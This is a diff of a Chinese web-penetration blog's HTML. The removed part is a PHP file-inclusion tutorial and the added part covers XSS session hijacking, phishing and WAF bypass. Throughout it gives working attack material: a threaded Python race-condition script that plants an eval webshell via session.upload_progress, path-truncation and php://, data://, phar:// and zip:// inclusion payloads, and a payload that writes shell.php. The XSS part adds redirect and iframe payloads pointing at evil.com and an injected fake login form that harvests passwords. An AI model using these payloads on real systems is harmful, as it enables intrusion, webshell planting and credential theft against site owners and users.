-<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
-<td>Apache配置文件</td>
-</tr>
-<tr>
-<td>&#x2F;etc&#x2F;my.conf</td>
-<td>mysql 配置文件</td>
-</tr>
-</tbody></table>
-<h3 id="Session漏洞利用"><a href="#Session漏洞利用" class="headerlink" title="Session漏洞利用"></a>Session漏洞利用</h3><ul>
-<li><strong>php中的session.upload_progress</strong></li>
-</ul>
-<p>前提：php版本 &gt; php5.4</p>
-<p>在php.ini中有几个默认选项</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.use_strict_mode</span>=<span class="literal">off</span></span><br></pre></td></tr></table></figure>
-
-<p>详解配置</p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">enabled=on表示upload<span class="built_in">_</span>progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">prefix+name将表示为session中的键名</span><br><span class="line">session.use<span class="built_in">_</span>strict<span class="built_in">_</span>mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。</span><br></pre></td></tr></table></figure>
-
-<p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
+<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
+<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
+<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
+<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
+<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
 <ul>
-<li>前提：session 的存储位置可以获取</li>
+<li><strong>重定向钓鱼</strong></li>
 </ul>
-<p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示</p>
-<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
+<p>将当前访问重定向到一个钓鱼网页</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>条件竞争</li>
+<li><strong>HTML注入式钓鱼</strong></li>
 </ul>
-<p>举个例子</p>
-<p>将包含漏洞的代码写入文件 session.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个代码功能，通过 GET 将变量值读入到 session 中。</p>
-<p>首先需要通过传入变量，查看 Cookies 中的 PHPSESSID 的值，其内容就是文件名。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/session.php?ctfs=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../var/lib/php/session文件名</span><br></pre></td></tr></table></figure>
-
-<p>通过上面写入的恶意代码，你访问文件名就可以执行了。</p>
-<p><strong>问题一</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有session_start(),如何创建session文件</span><br></pre></td></tr></table></figure>
-
-<p>解答：</p>
-<p>当session.auto_start&#x3D;on时，PHP在接受到请求后初始化Session，不用执行session_start（）。但是默认情况下，这个选项是不开启的。</p>
-<p>但是session中存在一个默认选项，<code>session.use_strict_mode=0</code>。表示用户可以自定义session的ID，例如，设置Cookie里的PHPSESSION&#x3D;FLAG，php就会在服务上创建一个文件：&#x2F;tmp&#x2F;sess_FLAG。虽然我们自己没有初始化，但是PHP也会自动初始化。并产生一个键值这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
-<p>漏洞利用脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
-<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
-<p>漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>它会在你访问的文件中加上 html ，但是你可以通过截断来绕过它。</p>
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
-
-<p><strong>长度绕过</strong></p>
-<p>前提：在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
-
-<p><strong>漏洞代码</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
-
-<p><strong>点号截断</strong></p>
-<p>Exp:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
-
-<p><strong>特殊符号</strong></p>
-<p>利用特色符号进行绕过，例如 ?、#、*、%20（空格）等</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt?</span><br></pre></td></tr></table></figure>
-
-<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>服务器的PHP配置文件中allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件。如果没有对远程文件进行严格的过滤，从而执行恶意代码。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line"></span><br><span class="line">allow_url_include = On（是否允许<span class="keyword">include</span>/<span class="keyword">require</span>远程文件）</span><br></pre></td></tr></table></figure>
-
-<p>漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=http://192.168.91.133/FI/test.php%20</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h2><p>PHP是门强大的语言，所以PHP里面有许多已经封装好的协议，类似于库函数，是可以直接调用的，由于没有进行严格过滤，入侵者就可以利用这些协议完成恶意操作。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
-<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
-
-<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>这是一个访问本地文件的协议。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line"></span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="left">名称</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
-<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
-</tr>
-<tr>
-<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
-<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
-</tr>
-<tr>
-<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
-<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
-</tr>
-<tr>
-<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
-<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
-</tr>
-</tbody></table>
-<p>漏洞代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br></pre></td></tr></table></figure>
-
-<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
-<ul>
-<li><strong>读取POST数据</strong></li>
-</ul>
-<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><strong>写入木马</strong></li>
+<li><strong>iframe钓鱼</strong></li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
-<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
-<p>就是你POST过去的PHP代码会被执行</p>
-<p>恶意代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>它会生成一个shell.php的一句话木马文件</p>
 <ul>
-<li><strong>命令执行</strong></li>
+<li><strong>Flash钓鱼</strong></li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
-<p>恶意代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>读取本地文件中的内容</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?file=file:///var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data:数据流封装器。一般遇到 <strong>file_get_contents()</strong> 可以来用</p>
-<p>用法：<code>data://text/plain;base64,</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意：<code>&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;</code>闭合;</p>
-<p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>恶意代码</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
-
-<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>这是 php 中用来解压打包文件的，不管后缀是什么。</p>
-<p>用法：?file&#x3D;phar: &#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php </p>
-<p>注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p>
-<p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=phar://shell.png/shell.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip 伪协议和 phar 协议类似，但是用法不一样。</p>
-<p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p>
-<p>前提： <strong>PHP &gt; &#x3D;5.3.0</strong></p>
-<p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
-
+<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
+<ul>
+<li><p>高级钓鱼技术</p>
+<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
+</li>
+</ul>
+<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
+<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
+<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
+<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
+<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
+<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
+<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
+<li><strong>HTML实体编码</strong></li>
+</ul>
+<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
+<p>字符编码</p>
+<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
+<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
+<ul>
+<li><strong>URL编码</strong></li>
+</ul>
+<p>两次URL全编码</p>
+<ul>
+<li><strong><code>String.fromCharCode</code>编码</strong></li>
+</ul>
+<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
+<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
+<hr>
+<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
 ]]></content>
       <categories>
         <category>web渗透</category>
